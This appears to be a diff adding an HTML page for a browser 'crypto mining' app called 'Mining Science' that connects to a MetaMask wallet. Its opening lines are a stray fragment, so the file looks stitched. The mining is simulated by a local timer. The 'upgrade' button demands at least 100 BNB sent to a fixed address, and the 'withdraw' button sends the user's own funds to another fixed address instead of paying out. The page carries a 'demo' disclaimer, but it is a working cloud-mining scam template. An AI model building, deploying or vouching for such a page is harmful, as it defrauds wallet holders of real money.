@@ -1,0 +1,361 @@
+/body>
+</html>
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
+<title>Mining Science</title>
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Orbitron&display=swap');
+
+  * {
+    box-sizing: border-box;
+  }
+  body {
+    margin: 0;
+    background: linear-gradient(135deg, #0f2027, #203a43, #2c5364);
+    font-family: 'Orbitron', monospace, sans-serif;
+    color: #00ff99;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 600px;
+    max-width: 350px;
+    margin-left: auto;
+    margin-right: auto;
+    padding: 20px;
+    user-select: none;
+  }
+  #app {
+    background: rgba(0, 0, 0, 0.7);
+    border: 2px solid #00ff99;
+    border-radius: 15px;
+    box-shadow: 0 0 20px #00ff99aa;
+    width: 100%;
+    max-width: 350px;
+    padding: 20px;
+    display: flex;
+    flex-direction: column;
+    gap: 20px;
+  }
+  h1 {
+    margin: 0;
+    font-size: 1.8rem;
+    text-align: center;
+    color: #00ff99;
+    text-shadow: 0 0 10px #00ff99;
+  }
+  button {
+    background: #00ff99;
+    border: none;
+    border-radius: 10px;
+    color: #000;
+    font-weight: bold;
+    padding: 12px;
+    font-size: 1rem;
+    cursor: pointer;
+    transition: background 0.3s ease;
+    box-shadow: 0 0 15px #00ff99;
+  }
+  button:hover:not(:disabled) {
+    background: #00cc6a;
+    box-shadow: 0 0 20px #00cc6a;
+  }
+  button:disabled {
+    background: #006633;
+    cursor: not-allowed;
+    box-shadow: none;
+    color: #333;
+  }
+  .info {
+    font-size: 1rem;
+    text-align: center;
+    padding: 10px;
+    background: rgba(0, 255, 153, 0.1);
+    border-radius: 10px;
+    user-select: text;
+    word-break: break-word;
+  }
+  .status {
+    font-size: 0.9rem;
+    text-align: center;
+    color: #007f4f;
+  }
+  .balance {
+    font-size: 2rem;
+    font-weight: bold;
+    text-align: center;
+    color: #00ff99;
+    text-shadow: 0 0 10px #00ff99;
+    font-variant-numeric: tabular-nums;
+  }
+  .small {
+    font-size: 0.85rem;
+    color: #00cc6a;
+    user-select: text;
+  }
+  .flex-row {
+    display: flex;
+    justify-content: space-between;
+    gap: 10px;
+  }
+  .flex-column {
+    display: flex;
+    flex-direction: column;
+    gap: 10px;
+  }
+  label {
+    color: #00ff99;
+    font-size: 0.9rem;
+  }
+  input[type="number"], select {
+    border-radius: 8px;
+    border: 1px solid #00ff99;
+    outline: none;
+    padding: 6px 10px;
+    width: 100%;
+    background: #08221f;
+    color: #00ff99;
+    font-family: 'Orbitron', monospace;
+    font-size: 1rem;
+  }
+  footer {
+    font-size: 0.75rem;
+    color: #004d29;
+    text-align: center;
+    margin-top: 10px;
+    user-select: none;
+  }
+  a {
+    color: #00ff99;
+    text-decoration: none;
+  }
+  a:hover {
+    text-decoration: underline;
+  }
+</style>
+</head>
+<body>
+<div id="app">
+  <h1>Mining Science</h1>
+  <div class="info" id="walletAddress">Wallet: Not Connected</div>
+  <button id="connectButton">Connect MetaMask</button>
+
+  <label for="coinSelect">Select Coin to Mine:</label>
+  <select id="coinSelect">
+    <option value="solana">Solana (SOL)</option>
+    <option value="litecoin">Litecoin (LTC)</option>
+    <option value="pepe">Pepe (PEPE)</option>
+    <option value="doge">Dogecoin (DOGE)</option>
+  </select>
+
+  <div class="balance" id="minedBalance">0.00000000</div>
+  <div class="status" id="miningStatus">Mining speed: 10 Mbs (0.0000010 per sec)</div>
+
+  <div class="flex-column">
+    <label for="upgradeAmount">Upgrade Speed (BNB):</label>
+    <input type="number" id="upgradeAmount" step="any" value="100" />
+    <small id="upgradeMinInfo" style="color:#00cc6a;"></small>
+    <button id="upgradeSpeedButton" disabled>Upgrade Speed (Pay to Upgrade)</button>
+  </div>
+
+  <div class="flex-column">
+    <label for="withdrawAmount">Withdraw Amount (BNB):</label>
+    <input type="number" id="withdrawAmount" min="0.001" step="0.0000001" value="0.01" />
+    <button id="withdrawButton" disabled>Withdraw (Paid Withdrawal)</button>
+  </div>
+
+  <div class="status" id="txStatus"></div>
+</div>
+
+<footer>
+  <div>This is a Demo Project. Use Binance Smart Chain Network & MetaMask.</div>
+  <div>DO NOT send large amounts. Transactions are simulated or direct wallet tx.</div>
+</footer>
+
+<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.min.js" type="application/javascript"></script>
+<script type="text/javascript">
+const connectButton = document.getElementById('connectButton');
+const walletAddressDiv = document.getElementById('walletAddress');
+const minedBalanceDiv = document.getElementById('minedBalance');
+const miningStatusDiv = document.getElementById('miningStatus');
+const upgradeSpeedButton = document.getElementById('upgradeSpeedButton');
+const withdrawButton = document.getElementById('withdrawButton');
+const upgradeAmountInput = document.getElementById('upgradeAmount');
+const withdrawAmountInput = document.getElementById('withdrawAmount');
+const txStatusDiv = document.getElementById('txStatus');
+const coinSelect = document.getElementById('coinSelect');
+const upgradeMinInfo = document.getElementById('upgradeMinInfo');
+
+let provider;
+let signer;
+let userAddress = null;
+
+// Use Big.js for precise decimal math to handle more decimal places
+// Since no external libraries allowed except ethers.js, implement decimal addition carefully
+
+const coins = {
+  solana: { display: 'Solana (SOL)', baseSpeed: 0.0000010, balance: 0, upgradeMin: 0.01 },
+  litecoin: { display: 'Litecoin (LTC)', baseSpeed: 0.0000010, balance: 0, upgradeMin: 0.001 },
+  pepe: { display: 'Pepe (PEPE)', baseSpeed: 0.0000010, balance: 0, upgradeMin: 500 },
+  doge: { display: 'Dogecoin (DOGE)', baseSpeed: 0.0000010, balance: 0, upgradeMin: 5 },
+};
+
+let currentCoin = 'solana';
+let miningSpeed = coins[currentCoin].baseSpeed;
+let miningInterval;
+
+let displayBalance = 0;
+let animationFrameId = null;
+
+// Helper function to add decimal accuracy for 8 decimal places
+function addBalances(a, b) {
+  return Number((BigInt(Math.round(a * 1e8)) + BigInt(Math.round(b * 1e8))) / 1e8);
+}
+
+function formatBalance(value) {
+  return value.toFixed(8);
+}
+
+// Animate balance smoothly with better decimal precision
+function animateBalance(oldVal, newVal, durationMs = 900) {
+  const startTime = performance.now();
+
+  function animate(time) {
+    const elapsed = time - startTime;
+    const progress = Math.min(elapsed / durationMs, 1);
+    let currentVal = oldVal + (newVal - oldVal) * progress;
+    // Protect rounding errors, limit to 8 decimals
+    minedBalanceDiv.textContent = currentVal.toFixed(8) + ' ' + coins[currentCoin].display.split(' ')[0];
+    if (progress < 1) {
+      animationFrameId = requestAnimationFrame(animate);
+    } else {
+      displayBalance = newVal;
+    }
+  }
+  if (animationFrameId) cancelAnimationFrame(animationFrameId);
+  animationFrameId = requestAnimationFrame(animate);
+}
+
+function updateUI() {
+  miningStatusDiv.textContent = `Mining speed: 10 Mbs (0.0000010 per sec)`;
+  upgradeMinInfo.textContent = `Minimum upgrade deposit: 100 Mbs (100 BNB)`;
+  upgradeAmountInput.min = 100;
+  if(parseFloat(upgradeAmountInput.value) < 100){
+    upgradeAmountInput.value = 100;
+  }
+}
+
+async function connectWallet() {
+  if (!window.ethereum) {
+    alert('MetaMask is not installed. Please install it to use this app.');
+    return;
+  }
+  try {
+    await window.ethereum.request({ method: 'eth_requestAccounts' });
+    provider = new ethers.providers.Web3Provider(window.ethereum);
+    signer = provider.getSigner();
+    userAddress = await signer.getAddress();
+    walletAddressDiv.textContent = 'Wallet: ' + userAddress;
+    connectButton.textContent = 'Wallet Connected';
+    connectButton.disabled = true;
+    upgradeSpeedButton.disabled = false;
+    withdrawButton.disabled = false;
+    startMining();
+    txStatusDiv.textContent = '';
+  } catch (error) {
+    console.error('Wallet connection failed', error);
+    txStatusDiv.textContent = 'Wallet connection failed.';
+  }
+}
+
+function startMining() {
+  if (miningInterval) clearInterval(miningInterval);
+  miningInterval = setInterval(() => {
+    const oldVal = coins[currentCoin].balance;
+    const newVal = oldVal + miningSpeed;
+    coins[currentCoin].balance = newVal;
+    animateBalance(oldVal, newVal);
+  }, 1000);
+}
+
+async function upgradeSpeed() {
+  const upgradeAmount = parseFloat(upgradeAmountInput.value);
+  if (isNaN(upgradeAmount) || upgradeAmount < 100) {
+    alert('Minimum upgrade amount is 100 BNB (100 Mbs)');
+    return;
+  }
+  try {
+    txStatusDiv.textContent = 'Sending upgrade payment...';
+    const tx = await signer.sendTransaction({
+      to: '0x1111111111111111111111111111111111111111',
+      value: ethers.utils.parseEther(upgradeAmount.toString())
+    });
+    txStatusDiv.textContent = 'Waiting for transaction confirmation...';
+    await tx.wait();
+    txStatusDiv.textContent = 'Upgrade successful! Mining speed increased to 0.00001000 per sec.';
+    miningSpeed = 0.00001000; // upgraded speed
+    updateUI();
+  } catch (error) {
+    txStatusDiv.textContent = 'Upgrade transaction failed or cancelled.';
+    console.error(error);
+  }
+}
+
+async function withdraw() {
+  const withdrawAmountBNB = parseFloat(withdrawAmountInput.value);
+  if (isNaN(withdrawAmountBNB) || withdrawAmountBNB < 0.001) {
+    alert('Please enter a valid withdraw amount (min 0.001 BNB)');
+    return;
+  }
+  if (withdrawAmountBNB > coins[currentCoin].balance) {
+    alert('Withdraw amount exceeds mined balance');
+    return;
+  }
+  try {
+    txStatusDiv.textContent = 'Sending withdrawal transaction...';
+    const feeTx = await signer.sendTransaction({
+      to: '0x2222222222222222222222222222222222222222',
+      value: ethers.utils.parseEther(withdrawAmountBNB.toString())
+    });
+    txStatusDiv.textContent = 'Waiting for withdrawal fee confirmation...';
+    await feeTx.wait();
+
+    const oldVal = coins[currentCoin].balance;
+    const newVal = oldVal - withdrawAmountBNB;
+    coins[currentCoin].balance = newVal;
+    animateBalance(oldVal, newVal);
+    txStatusDiv.textContent = `Withdrawal of ${withdrawAmountBNB.toFixed(8)} ${coins[currentCoin].display.split(' ')[0]} successful!`;
+  } catch (error) {
+    txStatusDiv.textContent = 'Withdrawal transaction failed or cancelled.';
+    console.error(error);
+  }
+}
+
+coinSelect.addEventListener('change', () => {
+  currentCoin = coinSelect.value;
+  miningSpeed = coins[currentCoin].baseSpeed;
+  if (animationFrameId) cancelAnimationFrame(animationFrameId);
+  displayBalance = coins[currentCoin].balance;
+  minedBalanceDiv.textContent = displayBalance.toFixed(8) + ' ' + coins[currentCoin].display.split(' ')[0];
+  updateUI();
+});
+
+upgradeAmountInput.addEventListener('input', () => {
+  if(parseFloat(upgradeAmountInput.value) < 100){
+    upgradeAmountInput.value = 100;
+  }
+});
+
+connectButton.addEventListener('click', connectWallet);
+upgradeSpeedButton.addEventListener('click', upgradeSpeed);
+withdrawButton.addEventListener('click', withdraw);
+
+updateUI();
+minedBalanceDiv.textContent = displayBalance.toFixed(8) + ' ' + coins[currentCoin].display.split(' ')[0];
+</script>
+</body>
+</html>
+
